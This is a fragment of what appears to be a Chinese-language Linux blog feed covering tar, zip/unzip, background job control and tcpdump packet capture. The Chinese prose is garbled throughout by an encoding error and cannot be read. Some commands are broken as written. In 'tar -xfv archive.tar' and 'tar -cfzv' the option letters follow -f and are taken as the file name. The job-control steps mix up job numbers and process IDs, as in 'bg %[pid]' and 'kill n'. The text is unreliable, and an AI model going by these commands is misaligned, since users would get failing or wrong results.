æŒ‡ä»¤å‹ç¼©/è§£å‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶åæœ€å¥½ä¸º*.tar.bz2</td></tr><tr><td>-v</td><td>æ˜¾ç¤ºæ“ä½œè¿‡ç¨‹</td></tr><tr><td>-l</td><td>æ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œè®¾ç½®</td></tr><tr><td>-k</td><td>ä¿ç•™åŸæœ‰æ–‡ä»¶ä¸è¦†ç›–</td></tr><tr><td>-m</td><td>ä¿ç•™æ–‡ä»¶ä¸è¢«è¦†ç›–</td></tr><tr><td>-w</td><td>ç¡®è®¤å‹ç¼©æ–‡ä»¶çš„æ­£ç¡®æ€§</td></tr><tr><td>-p</td><td>ä¿ç•™åŸæ¥çš„æ–‡ä»¶æƒé™ä¸å±æ€§</td></tr><tr><td>-P</td><td>ä½¿ç”¨æ–‡ä»¶åçš„ç»å¯¹è·¯å¾„ï¼Œä¸ç§»é™¤æ–‡ä»¶åç§°å‰çš„â€œ/â€å·</td></tr><tr><td>-N &lt;æ—¥æœŸæ ¼å¼&gt;</td><td>åªå°†è¾ƒæŒ‡å®šæ—¥æœŸæ›´æ–°çš„æ–‡ä»¶ä¿å­˜åˆ°å¤‡ä»½æ–‡ä»¶é‡Œ</td></tr><tr><td>â€“ -exclude=&lt;èŒƒæœ¬æ ·å¼&gt;</td><td>æ’é™¤ç¬¦åˆèŒƒæœ¬æ ·å¼çš„æ–‡ä»¶</td></tr><tr><td>â€“ -remove-files</td><td>å½’æ¡£/å‹ç¼©ä¹‹ååˆ é™¤æºæ–‡ä»¶</td></tr></tbody></table><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>ä»å­˜æ¡£ä¸­æå–æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -xfv archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>é€‰é¡¹ï¼šx = æå–ï¼Œf = æ–‡ä»¶ï¼Œv = è¯¦ç»†</p></blockquote><p>ä»æ–‡ä»¶å¤¹å’Œæ–‡ä»¶åˆ›å»ºæœªå‹ç¼©çš„ <strong>tar</strong> å­˜æ¡£ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -cfv archive.tar file1 file2 file3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>é€‰é¡¹ï¼šc = åˆ›å»º</p></blockquote><p>ä»æ–‡ä»¶å¤¹å’Œæ–‡ä»¶åˆ›å»ºå‹ç¼©çš„ <strong>tar</strong> å­˜æ¡£ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -cfzv archive.tar file1 file2 file3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>é€‰é¡¹ï¼šz = ä½¿ç”¨ gzip å‹ç¼©</p></blockquote><p>æ˜¾ç¤ºå­˜æ¡£çš„æ‰€æœ‰æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -tvf archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åœ¨å½“å‰ç›®å½•ä¸­åˆ›å»ºæ‰€æœ‰ <strong>.txt</strong> æ–‡ä»¶çš„æœªå‹ç¼©å­˜æ¡£ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -cfv archive.tar *.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ä» gzip tar å‹ç¼©åŒ… <strong>archive.tar.gz</strong> ä¸­æå–æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -xvzf archive.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ä½¿ç”¨<strong>bzip2</strong>åˆ›å»ºä¸€ä¸ªå‹ç¼©çš„<strong>tar</strong>å­˜æ¡£æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> cvfj archive.tar.tbz example.cpp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>é€‰é¡¹ï¼šj = ä½¿ç”¨ bzip2 å‹ç¼©ï¼Œæ–‡ä»¶å¤§å°æ›´å°ï¼Œä½†éœ€è¦çš„æ—¶é—´é•¿äº-z</p></blockquote><p>â€‹</p><p>é€šè¿‡å°† todo.txt æ–‡ä»¶æ·»åŠ åˆ°å­˜æ¡£æ¥æ›´æ–°ç°æœ‰çš„ tar æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -rvf archive.tar todo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>é€‰é¡¹ï¼šr = æ·»åŠ æ–‡ä»¶</p></blockquote><p>åˆ—å‡ºå‹ç¼©æ–‡ä»¶é‡Œçš„å†…å®¹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -tzvf test.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>è§£å‹æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -xzvf test.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åˆ—å‡º tar æ–‡ä»¶çš„å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> -tf file.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>é€‰é¡¹ï¼št = display, f = file</p></blockquote><p>åˆ›å»ºå½“å‰ç›®å½•çš„å‹ç¼©å­˜æ¡£ï¼Œä½†æ’é™¤æŸäº›ç›®å½•ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">tar</span> --exclude<span class="token operator">=</span><span class="token string">'./folder'</span> --exclude<span class="token operator">=</span><span class="token string">'./upload/folder2'</span> -cfzv archive.tar <span class="token keyword">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ’é™¤ â€œfolderâ€ å’Œ â€œfolder2â€</p></blockquote><h2 id="äºŒã€zip-å’Œ-unzip"><a href="#äºŒã€zip-å’Œ-unzip" class="headerlink" title="äºŒã€zip å’Œ unzip"></a>äºŒã€zip å’Œ unzip</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>Linux zip å‘½ä»¤ç”¨äºå‹ç¼©æ–‡ä»¶ï¼Œzip æ˜¯ä¸ªä½¿ç”¨å¹¿æ³›çš„å‹ç¼©ç¨‹åºï¼Œå‹ç¼©åçš„æ–‡ä»¶åç¼€åä¸º <strong>.zip</strong>ã€‚<br>Linux unzip å‘½ä»¤ç”¨äºè§£å‹ç¼© zip æ–‡ä»¶ï¼Œunzip ä¸º**.zip**å‹ç¼©æ–‡ä»¶çš„è§£å‹ç¼©ç¨‹åºã€‚<br>â€‹</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>åŸºäº Ubuntu å’Œ Debian çš„æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆ</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">zip</span> unzip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åŸºäº CentOS å’Œ Fedora çš„æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆ</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> <span class="token function">zip</span> unzip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="è¯­æ³•æ ¼å¼"><a href="#è¯­æ³•æ ¼å¼" class="headerlink" title="è¯­æ³•æ ¼å¼"></a>è¯­æ³•æ ¼å¼</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> <span class="token punctuation">[</span>å‚æ•°<span class="token punctuation">]</span> <span class="token punctuation">[</span>æ–‡ä»¶<span class="token punctuation">]</span>unzip <span class="token punctuation">[</span>å‚æ•°<span class="token punctuation">]</span> <span class="token punctuation">[</span>æ–‡ä»¶<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><h3 id="å¸¸ç”¨å‚æ•°-1"><a href="#å¸¸ç”¨å‚æ•°-1" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><p>zip å‘½ä»¤</p><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>ä»‹ç»</strong></th></tr></thead><tbody><tr><td>-q</td><td>ä¸æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹</td></tr><tr><td>-r</td><td>é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ä¸€å¹¶å¤„ç†</td></tr><tr><td>-z</td><td>æ›¿å‹ç¼©æ–‡ä»¶åŠ ä¸Šæ³¨é‡Š</td></tr><tr><td>-v</td><td>æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹æˆ–æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td>-n &lt;å­—å°¾å­—ç¬¦ä¸²&gt;</td><td>ä¸å‹ç¼©å…·æœ‰ç‰¹å®šå­—å°¾å­—ç¬¦ä¸²çš„æ–‡ä»¶</td></tr></tbody></table><p>unzip å‘½ä»¤</p><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>ä»‹ç»</strong></th></tr></thead><tbody><tr><td>-l</td><td>æ˜¾ç¤ºå‹ç¼©æ–‡ä»¶å†…æ‰€åŒ…å«çš„æ–‡ä»¶</td></tr><tr><td>-v</td><td>æ‰§è¡Œæ—¶æ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯</td></tr><tr><td>-c</td><td>å°†è§£å‹ç¼©çš„ç»“æœæ˜¾ç¤ºåˆ°å±å¹•ä¸Šï¼Œå¹¶å¯¹å­—ç¬¦åšé€‚å½“çš„è½¬æ¢</td></tr><tr><td>-n</td><td>è§£å‹ç¼©æ—¶ä¸è¦è¦†ç›–åŸæœ‰çš„æ–‡ä»¶</td></tr><tr><td>-j</td><td>ä¸å¤„ç†å‹ç¼©æ–‡ä»¶ä¸­åŸæœ‰çš„ç›®å½•è·¯å¾„</td></tr><tr><td>-d</td><td>è§£å‹åˆ°æŒ‡å®šè·¯å¾„</td></tr></tbody></table><h3 id="zip-ç¤ºä¾‹"><a href="#zip-ç¤ºä¾‹" class="headerlink" title="zip ç¤ºä¾‹"></a>zip ç¤ºä¾‹</h3><p>å°†**/home/html/<strong>è¿™ä¸ªç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“åŒ…ä¸ºå½“å‰ç›®å½•ä¸‹çš„</strong>html.zip**ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -q -r html.zip /home/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å‹ç¼©æ–‡ä»¶<strong>cp.zip</strong>ä¸­åˆ é™¤æ–‡ä»¶<strong>a.c</strong>ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -dv cp.zip a.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æŠŠ<strong>mydata</strong>ç›®å½•å‹ç¼©ä¸º<strong>mydata.zip</strong>ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -r mydata.zip mydata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æŠŠ<strong>abc</strong>æ–‡ä»¶å¤¹å’Œ<strong>123.txt</strong>å‹ç¼©æˆä¸º<strong>abc123.zip</strong>ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">zip</span> -r abc123.zip abc 123.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="unzip-ç¤ºä¾‹"><a href="#unzip-ç¤ºä¾‹" class="headerlink" title="unzip ç¤ºä¾‹"></a>unzip ç¤ºä¾‹</h3><p>æŠŠ<strong>mydata.zip</strong>è§£å‹åˆ°<strong>mydatabak</strong>ç›®å½•é‡Œé¢ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">unzip mydata.zip -d mydatabak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æŠŠ <strong>wwwroot.zip</strong> ç›´æ¥è§£å‹åˆ°å½“å‰ç›®å½•ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">unzip wwwroot.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æŠŠå½“å‰ç›®å½•ä¸‹çš„<strong>æ‰€æœ‰ zip æ–‡ä»¶</strong>åŒæ—¶è§£å‹åˆ°å½“å‰ç›®å½•ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">unzip abc\*.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>æŸ¥çœ‹ <strong>wwwroot.zip</strong> é‡Œé¢çš„å†…å®¹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">unzip -v wwwroot.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>éªŒè¯ <strong>wwwroot.zip</strong> æ˜¯å¦å®Œæ•´ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">unzip -t wwwroot.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸‰ã€æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ä¿¡æ¯"><a href="#ä¸‰ã€æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ä¿¡æ¯" class="headerlink" title="ä¸‰ã€æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ä¿¡æ¯"></a>ä¸‰ã€æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ä¿¡æ¯</h2><p>ä½¿ç”¨ <strong>file</strong> å‘½ä»¤æŸ¥çœ‹ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">file</span> test.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨ <strong>zipinfo</strong>æŸ¥çœ‹<strong>zip æ–‡ä»¶</strong>ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">zipinfo test.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä»»åŠ¡çš„å‰åå°ç®¡ç†</title>
      <link href="/post/8ed3ed3a.html"/>
      <url>/post/8ed3ed3a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ä»»åŠ¡çš„å‰åå°ç®¡ç†"><a href="#Linux-ä»»åŠ¡çš„å‰åå°ç®¡ç†" class="headerlink" title="Linux ä»»åŠ¡çš„å‰åå°ç®¡ç†"></a>Linux ä»»åŠ¡çš„å‰åå°ç®¡ç†</h1><h2 id="ä¸€ã€ä»‹ç»"><a href="#ä¸€ã€ä»‹ç»" class="headerlink" title="ä¸€ã€ä»‹ç»"></a>ä¸€ã€ä»‹ç»</h2><p>Linux åœ¨å‘½ä»¤è¡Œä¸­å¯åŠ¨æŸä¸ªä»»åŠ¡æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯å‰å°ï¼Œä¸€ç§æ˜¯åå°ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œå¯¹äºçŸ­æ—¶ä»»åŠ¡ï¼Œæˆ‘ä»¬ä»¥å‰å°æ–¹å¼è¿è¡Œï¼Œåœ¨è¿™ç§æ–¹å¼ä¸‹ï¼Œä»»åŠ¡è¿è¡Œç»“æŸåç”¨æˆ·ä¼šå†æ¬¡å›åˆ°å‘½ä»¤è¡Œï¼› è€Œå¯¹äºé•¿æ—¶ä»»åŠ¡ï¼Œä¸€èˆ¬å¸Œæœ›ä»¥åå°æ–¹å¼è¿è¡Œï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå½“ç”¨æˆ·é€€å‡ºå‘½ä»¤è¡Œæ—¶å¹¶ä¸å½±å“ä»»åŠ¡è¿è¡Œã€‚<br>â€‹</p><h2 id="äºŒã€åŸºæœ¬å‘½ä»¤"><a href="#äºŒã€åŸºæœ¬å‘½ä»¤" class="headerlink" title="äºŒã€åŸºæœ¬å‘½ä»¤"></a>äºŒã€åŸºæœ¬å‘½ä»¤</h2><ol><li>åœ¨ Linux ç»ˆç«¯è¿è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œåœ¨å‘½ä»¤æœ«å°¾åŠ ä¸Š <strong>&amp;</strong> ç¬¦å·ï¼Œå°±å¯ä»¥è®©ç¨‹åºåœ¨åå°è¿è¡Œ</li><li>å¦‚æœç¨‹åºæ­£åœ¨å‰å°è¿è¡Œï¼Œå¯ä»¥ä½¿ç”¨ <strong>Ctrl+z</strong> é€‰é¡¹æŠŠç¨‹åºæš‚åœ</li><li>ç”¨<strong>jobs -l</strong>æŸ¥çœ‹åˆšæ‰æš‚åœçš„ç¨‹åºçš„ pid(è¿›ç¨‹å·)</li><li>ä½¿ç”¨ <strong>bg %[pid]</strong> å‘½ä»¤è®©è¿™ä¸ªæš‚åœçš„ç¨‹åºåœ¨åå°ç»§ç»­è¿è¡Œ</li><li><strong>jobs</strong> å‘½ä»¤æŸ¥çœ‹å½“å‰ç»ˆç«¯åå°è¿è¡Œçš„ä»»åŠ¡ï¼ŒåŒæ—¶ä¹Ÿèƒ½çœ‹</li><li>ä½¿ç”¨ <strong>kill [pid]</strong> å‘½ä»¤å¯ä»¥ç»ˆæ­¢è¿›ç¨‹</li></ol><p>â€‹</p><h3 id="è®©è¿›ç¨‹åœ¨åå°è¿è¡Œ"><a href="#è®©è¿›ç¨‹åœ¨åå°è¿è¡Œ" class="headerlink" title="è®©è¿›ç¨‹åœ¨åå°è¿è¡Œ"></a>è®©è¿›ç¨‹åœ¨åå°è¿è¡Œ</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">command</span> <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æŸ¥çœ‹åå°è¿è¡Œçš„è¿›ç¨‹"><a href="#æŸ¥çœ‹åå°è¿è¡Œçš„è¿›ç¨‹" class="headerlink" title="æŸ¥çœ‹åå°è¿è¡Œçš„è¿›ç¨‹"></a>æŸ¥çœ‹åå°è¿è¡Œçš„è¿›ç¨‹</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">jobs</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è®©åå°è¿è¡Œçš„è¿›ç¨‹-n-åˆ°å‰å°æ¥"><a href="#è®©åå°è¿è¡Œçš„è¿›ç¨‹-n-åˆ°å‰å°æ¥" class="headerlink" title="è®©åå°è¿è¡Œçš„è¿›ç¨‹ n åˆ°å‰å°æ¥"></a>è®©åå°è¿è¡Œçš„è¿›ç¨‹ n åˆ°å‰å°æ¥</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">fg</span> %n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è®©è¿›ç¨‹-n-åˆ°åå°å»"><a href="#è®©è¿›ç¨‹-n-åˆ°åå°å»" class="headerlink" title="è®©è¿›ç¨‹ n åˆ°åå°å»"></a>è®©è¿›ç¨‹ n åˆ°åå°å»</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bg</span> %n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="ç»“æŸè¿›ç¨‹-n"><a href="#ç»“æŸè¿›ç¨‹-n" class="headerlink" title="ç»“æŸè¿›ç¨‹ n"></a>ç»“æŸè¿›ç¨‹ n</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>PSï¼šâ€nâ€ ä¸º jobs æŸ¥çœ‹åˆ°çš„è¿›ç¨‹ç¼–å·</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcpdumpæŠ“åŒ…åˆ†ætcp</title>
      <link href="/post/e7ae6b8b.html"/>
      <url>/post/e7ae6b8b.html</url>
      
        <content type="html"><![CDATA[<h1 id="tcpdump-æŠ“åŒ…åˆ†æ-tcp-ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹"><a href="#tcpdump-æŠ“åŒ…åˆ†æ-tcp-ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹" class="headerlink" title="tcpdump æŠ“åŒ…åˆ†æ tcp ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹"></a>tcpdump æŠ“åŒ…åˆ†æ tcp ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹</h1><h2 id="ä¸€ã€tcpdump-ç®€ä»‹"><a href="#ä¸€ã€tcpdump-ç®€ä»‹" class="headerlink" title="ä¸€ã€tcpdump ç®€ä»‹"></a>ä¸€ã€tcpdump ç®€ä»‹</h2><p>tcpdump æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨å‘½ä»¤è¡Œä¸‹çš„æ•°æ®åŒ…åˆ†æå™¨ã€‚å®ƒå…è®¸ç”¨æˆ·æ‹¦æˆªå’Œæ˜¾ç¤ºå‘é€æˆ–æ”¶åˆ°è¿‡ç½‘ç»œè¿æ¥åˆ°è¯¥è®¡ç®—æœºçš„ TCP/IP å’Œå…¶ä»–æ•°æ®åŒ…ã€‚<br>â€‹</p><h2 id="äºŒã€tcpdump-ä½¿ç”¨æ–¹æ³•"><a href="#äºŒã€tcpdump-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="äºŒã€tcpdump ä½¿ç”¨æ–¹æ³•"></a>äºŒã€tcpdump ä½¿ç”¨æ–¹æ³•</h2><h3 id="1-åŸºæœ¬ç”¨æ³•"><a href="#1-åŸºæœ¬ç”¨æ³•" class="headerlink" title="1. åŸºæœ¬ç”¨æ³•"></a>1. åŸºæœ¬ç”¨æ³•</h3><p>ç›‘è§†æŒ‡å®šç½‘ç»œæ¥å£çš„æ•°æ®åŒ…ï¼Œè¿™æ˜¯ä¸ªå¿…éœ€å‚æ•°</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç›‘è§†æŒ‡å®šä¸»æœºçš„æ•°æ®åŒ…ï¼Œæ‰“å°æ‰€æœ‰è¿›å…¥æˆ–ç¦»å¼€ <strong>truda</strong> çš„æ•°æ®åŒ…</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33 host truda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ä¹Ÿå¯ä»¥æŒ‡å®š IPï¼Œä¾‹å¦‚æˆªè·æ‰€æœ‰ <strong>192.168.2.10</strong> çš„ä¸»æœºæ”¶åˆ°çš„å’Œå‘å‡ºçš„æ‰€æœ‰çš„æ•°æ®åŒ…</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33 host 192.168.2.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆªè·ä¸»æœº<strong>192.168.10.11</strong>å’Œä¸»æœº<strong>192.168.10.12</strong>æˆ–<strong>192.168.10.13</strong>çš„é€šä¿¡</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -i ens33 host 192.168.10.11 and \<span class="token punctuation">(</span>192.168.10.12 or 192.168.10.13 \<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-é€‰é¡¹"><a href="#2-é€‰é¡¹" class="headerlink" title="2. é€‰é¡¹"></a>2. é€‰é¡¹</h3><pre class="line-numbers language-bash"><code class="language-bash">-aï¼šå°è¯•å°†ç½‘ç»œå’Œå¹¿æ’­åœ°å€è½¬æ¢æˆåç§°ï¼›-c<span class="token operator">&lt;</span>æ•°æ®åŒ…æ•°ç›®<span class="token operator">></span>ï¼šæ”¶åˆ°æŒ‡å®šçš„æ•°æ®åŒ…æ•°ç›®åï¼Œå°±åœæ­¢è¿›è¡Œå€¾å€’æ“ä½œï¼›-dï¼šæŠŠç¼–è¯‘è¿‡çš„æ•°æ®åŒ…ç¼–ç è½¬æ¢æˆå¯é˜…è¯»çš„æ ¼å¼ï¼Œå¹¶å€¾å€’åˆ°æ ‡å‡†è¾“å‡ºï¼›-ddï¼šæŠŠç¼–è¯‘è¿‡çš„æ•°æ®åŒ…ç¼–ç è½¬æ¢æˆCè¯­è¨€çš„æ ¼å¼ï¼Œå¹¶å€¾å€’åˆ°æ ‡å‡†è¾“å‡ºï¼›-dddï¼šæŠŠç¼–è¯‘è¿‡çš„æ•°æ®åŒ…ç¼–ç è½¬æ¢æˆåè¿›åˆ¶æ•°å­—çš„æ ¼å¼ï¼Œå¹¶å€¾å€’åˆ°æ ‡å‡†è¾“å‡ºï¼›-eï¼šåœ¨æ¯åˆ—å€¾å€’èµ„æ–™ä¸Šæ˜¾ç¤ºè¿æ¥å±‚çº§çš„æ–‡ä»¶å¤´ï¼›-fï¼šç”¨æ•°å­—æ˜¾ç¤ºç½‘é™…ç½‘ç»œåœ°å€ï¼›-F<span class="token operator">&lt;</span>è¡¨è¾¾æ–‡ä»¶<span class="token operator">></span>ï¼šæŒ‡å®šå†…å«è¡¨è¾¾æ–¹å¼çš„æ–‡ä»¶ï¼›-i<span class="token operator">&lt;</span>ç½‘ç»œç•Œé¢<span class="token operator">></span>ï¼šä½¿ç”¨æŒ‡å®šçš„ç½‘ç»œæˆªé¢é€å‡ºæ•°æ®åŒ…ï¼›-lï¼šä½¿ç”¨æ ‡å‡†è¾“å‡ºåˆ—çš„ç¼“å†²åŒºï¼›-nï¼šä¸æŠŠä¸»æœºçš„ç½‘ç»œåœ°å€è½¬æ¢æˆåå­—ï¼›-Nï¼šä¸åˆ—å‡ºåŸŸåï¼›-Oï¼šä¸å°†æ•°æ®åŒ…ç¼–ç æœ€ä½³åŒ–ï¼›-pï¼šä¸è®©ç½‘ç»œç•Œé¢è¿›å…¥æ··æ‚æ¨¡å¼ï¼›-q ï¼šå¿«é€Ÿè¾“å‡ºï¼Œä»…åˆ—å‡ºå°‘æ•°çš„ä¼ è¾“åè®®ä¿¡æ¯ï¼›-r<span class="token operator">&lt;</span>æ•°æ®åŒ…æ–‡ä»¶<span class="token operator">></span>ï¼šä»æŒ‡å®šçš„æ–‡ä»¶è¯»å–æ•°æ®åŒ…æ•°æ®ï¼›-s<span class="token operator">&lt;</span>æ•°æ®åŒ…å¤§å°<span class="token operator">></span>ï¼šè®¾ç½®æ¯ä¸ªæ•°æ®åŒ…çš„å¤§å°ï¼›-Sï¼šç”¨ç»å¯¹è€Œéç›¸å¯¹æ•°å€¼åˆ—å‡ºTCPå…³è”æ•°ï¼›-tï¼šåœ¨æ¯åˆ—å€¾å€’èµ„æ–™ä¸Šä¸æ˜¾ç¤ºæ—¶é—´æˆ³è®°ï¼›-ttï¼š åœ¨æ¯åˆ—å€¾å€’èµ„æ–™ä¸Šæ˜¾ç¤ºæœªç»æ ¼å¼åŒ–çš„æ—¶é—´æˆ³è®°ï¼›-T<span class="token operator">&lt;</span>æ•°æ®åŒ…ç±»å‹<span class="token operator">></span>ï¼šå¼ºåˆ¶å°†è¡¨è¾¾æ–¹å¼æ‰€æŒ‡å®šçš„æ•°æ®åŒ…è½¬è¯‘æˆè®¾ç½®çš„æ•°æ®åŒ…ç±»å‹ï¼›-vï¼šè¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-vvï¼šæ›´è¯¦ç»†æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-xï¼šç”¨åå…­è¿›åˆ¶å­—ç åˆ—å‡ºæ•°æ®åŒ…èµ„æ–™ï¼›-w<span class="token operator">&lt;</span>æ•°æ®åŒ…æ–‡ä»¶<span class="token operator">></span>ï¼šæŠŠæ•°æ®åŒ…æ•°æ®å†™å…¥æŒ‡å®šçš„æ–‡ä»¶ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€TCP-IP-ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹åˆ†æ"><a 